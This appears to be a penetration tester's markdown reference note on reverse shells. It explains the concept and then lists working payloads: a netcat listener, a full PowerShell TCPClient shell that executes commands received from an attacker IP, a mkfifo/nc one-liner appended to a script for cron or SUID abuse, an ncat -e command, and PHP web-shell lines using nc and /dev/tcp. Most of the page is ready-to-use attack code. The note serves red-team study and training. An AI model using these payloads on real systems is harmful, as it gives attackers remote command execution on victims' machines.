---
id: Reverse Shell
aliases:
  - Revshell
tags:
  - Pentest/Shells/Reverse-Shell
---

<!-- Reverse Shell {{{-->
# Reverse Shell

The concept of a **Reverse Shell** is that
the target’s machine acts as a client
and the attacker’s machine acts as a server

The target machine is initiating the connection to the attacker machine,
potentially bypassing security measures
(*e.g., firewalls*)

<!-- Tip {{{-->
> [!tip]-
>
> Common ports:
>
> - [[HTTP/General|HTTP]]: `443`
<!-- }}} -->

1. **Attacker**: Listen on port `443`

```sh
nc -lvnp 443
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> kali@kali:~$ nc -lvnp 443
> ```
> ```sh
> Listening on [0.0.0.0] (family 0, port 443)
> ```
<!-- }}} -->

2. **Target**: Establish a reverse shell

<!-- Resources {{{-->
> [!info]- Resources
>
> - [RevShells.com](https://www.revshells.com/)
>
> - [InternalAllTheThings - Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
> ```
<!-- }}} -->
___

<!-- Bash {{{-->
## Bash

Append a shell to an executable file and execute it
(*e.g., via Cron Job, SUID, sudo or user execution*)
to spawn a reverse shell to the attacker

```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f' | tee -a <file.sh>
```

___
<!-- }}} -->

<!-- Netcat {{{-->
## Netcat

[[Netcat]] — Establish a reverse shell session to the target

```sh
ncat <attacker_ip> <attacker_port> -e /bin/bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ncat 10.21.196.86 1234 -e /bin/bash
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- PowerShell {{{-->
## PowerShell

[Nishang](https://github.com/samratashok/nishang/tree/master)

Offensive PowerShell for red team,
penetration testing and offensive security

___
<!-- }}} -->

<!-- PHP {{{-->
## PHP

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f"); ?>
```
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'"); ?>
```
___
<!-- }}}-->

<!-- }}} -->
